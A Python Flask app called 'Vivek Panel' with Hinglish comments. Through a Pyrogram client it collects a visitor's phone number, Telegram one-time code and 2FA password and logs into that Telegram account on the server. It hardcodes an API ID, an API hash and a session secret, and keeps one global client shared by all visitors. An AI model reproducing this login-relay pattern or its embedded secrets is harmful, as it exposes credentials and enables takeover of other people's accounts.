import os
from flask import Flask, render_template_string, request, redirect, url_for, session
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded

app = Flask(__name__)
app.secret_key = "vivek_panel_secret_key"

# Aapki credentials
API_ID = 30357864
API_HASH = "8d8a1027816b1724b0b420480ea06a6f"

# Temporary store karne ke liye client object
temp_storage = {}

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Vivek Panel</title>
    <style>
        body { font-family: Arial, sans-serif; background: #0f172a; color: #f8fafc; text-align: center; padding: 40px; }
        .card { background: #1e293b; padding: 30px; border-radius: 12px; display: inline-block; box-shadow: 0 4px 20px rgba(0,0,0,0.6); width: 360px; text-align: left; }
        h1 { color: #38bdf8; text-align: center; margin-bottom: 5px; font-size: 24px; }
        p { color: #94a3b8; text-align: center; margin-bottom: 20px; font-size: 13px; }
        label { font-size: 13px; color: #cbd5e1; display: block; margin-top: 10px; }
        input { width: 100%; padding: 10px; margin-top: 5px; margin-bottom: 15px; border-radius: 6px; border: 1px solid #475569; background: #0f172a; color: white; box-sizing: border-box; }
        .btn { width: 100%; padding: 12px; font-size: 15px; font-weight: bold; color: white; background: #0284c7; border: none; border-radius: 6px; cursor: pointer; transition: 0.2s; }
        .btn:hover { background: #0ea5e9; }
        .btn-danger { background: #dc2626; margin-top: 10px; }
        .btn-danger:hover { background: #ef4444; }
        .error { color: #f87171; font-size: 12px; margin-bottom: 10px; text-align: center; }
        .success { color: #4ade80; font-size: 14px; text-align: center; margin-bottom: 15px; }
    </style>
</head>
<body>
    <div class="card">
        <h1>Vivek Panel</h1>
        <p>Telegram Web Login Dashboard</p>
        
        {% if error %}
            <div class="error">{{ error }}</div>
        {% endif %}

        {% if step == 'phone' %}
            <form method="POST" action="/send-code">
                <label>Phone Number (with Country Code):</label>
                <input type="text" name="phone" placeholder="+919876543210" required>
                <button type="submit" class="btn">Send OTP</button>
            </form>
        {% elif step == 'otp' %}
            <form method="POST" action="/verify-otp">
                <label>Enter Telegram OTP:</label>
                <input type="text" name="otp" placeholder="12345" required>
                <button type="submit" class="btn">Verify OTP</button>
            </form>
        {% elif step == 'password' %}
            <form method="POST" action="/verify-password">
                <label>2FA Cloud Password:</label>
                <input type="password" name="password" placeholder="Enter your 2FA password" required>
                <button type="submit" class="btn">Login</button>
            </form>
        {% elif step == 'dashboard' %}
            <div class="success">✅ Successfully Logged In!</div>
            <p style="color: #38bdf8;">Your Userbot session is active and ready.</p>
            <a href="/logout" class="btn btn-danger" style="display: block; text-align: center; text-decoration: none;">Logout / Reset</a>
        {% endif %}
    </div>
</body>
</html>
"""

@app.route("/")
def index():
    if session.get("logged_in"):
        return render_template_string(HTML_TEMPLATE, step="dashboard")
    elif session.get("waiting_for_password"):
        return render_template_string(HTML_TEMPLATE, step="password")
    elif session.get("waiting_for_otp"):
        return render_template_string(HTML_TEMPLATE, step="otp")
    else:
        return render_template_string(HTML_TEMPLATE, step="phone")

@app.route("/send-code", methods=["POST"])
def send_code():
    phone = request.form.get("phone").strip()
    session["phone"] = phone
    try:
        # In-memory client banakar OTP bhejte hain
        client = Client(f"session_{phone.replace('+', '')}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
        client.connect()
        sent_code = client.send_code(phone)
        session["phone_code_hash"] = sent_code.phone_code_hash
        temp_storage["client"] = client
        session["waiting_for_otp"] = True
    except Exception as e:
        return render_template_string(HTML_TEMPLATE, step="phone", error=str(e))
    return redirect(url_for("index"))

@app.route("/verify-otp", methods=["POST"])
def verify_otp():
    otp = request.form.get("otp").strip().replace(" ", "")
    phone = session.get("phone")
    phone_code_hash = session.get("phone_code_hash")
    client = temp_storage.get("client")
    
    try:
        client.sign_in(phone, phone_code_hash, otp)
        session["logged_in"] = True
        session.pop("waiting_for_otp", None)
        client.disconnect()
    except SessionPasswordNeeded:
        session.pop("waiting_for_otp", None)
        session["waiting_for_password"] = True
    except Exception as e:
        return render_template_string(HTML_TEMPLATE, step="otp", error=str(e))
    return redirect(url_for("index"))

@app.route("/verify-password", methods=["POST"])
def verify_password():
    password = request.form.get("password")
    client = temp_storage.get("client")
    try:
        client.check_password(password)
        session["logged_in"] = True
        session.pop("waiting_for_password", None)
        client.disconnect()
    except Exception as e:
        return render_template_string(HTML_TEMPLATE, step="password", error=str(e))
    return redirect(url_for("index"))

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("index"))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
